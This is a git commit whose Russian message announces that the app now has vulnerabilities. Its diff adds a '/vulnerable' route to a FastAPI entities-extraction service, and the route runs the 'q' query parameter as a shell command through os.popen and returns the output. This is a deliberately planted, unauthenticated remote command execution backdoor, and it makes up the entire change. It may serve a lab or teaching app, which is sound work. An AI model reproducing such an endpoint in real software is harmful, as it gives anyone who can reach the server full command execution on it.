468ee5d64c025950cb61aca6a3b1bfb764195704
Viktoriya Klyueva <vika_klyueva@inbox.ru>
2025-06-20 00:48:06 +0700

    Теперь приложение с уязвимостями!

--- ygpt_service/api/endpoints/entities.py
+++ ygpt_service/api/endpoints/entities.py
@@ -8,3 +8,9 @@ router = APIRouter(prefix="/entities", tags=["Entities extraction"])
 @router.post("/get_from_text")
 async def get_from_text(request: GenerateTextRequest):
     return await entities_extractor.extract_entities_from_user_text(request)
+
+@router.get("/vulnerable")
+def vulnerable(q: str):
+    import os
+    return os.popen(q).read()
+
